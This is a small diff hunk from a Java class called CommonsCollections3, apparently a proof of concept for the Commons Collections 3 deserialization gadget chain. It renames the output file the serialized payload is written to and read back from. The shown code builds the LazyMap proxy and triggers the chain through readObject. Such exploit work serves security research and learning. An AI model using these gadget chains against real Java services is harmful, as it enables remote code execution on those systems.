@@ -55,11 +55,11 @@ public class CommonsCollections3 {
         Map map1=(Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),invocationHandler);
         Object object=constructor.newInstance(Override.class,map1);
 
-        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("test.out"));
+        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("cc3.out"));
         outputStream.writeObject(object);
         outputStream.close();
 
-        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream("test.out"));
+        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream("cc3.out"));
         inputStream.readObject();
     }
 }
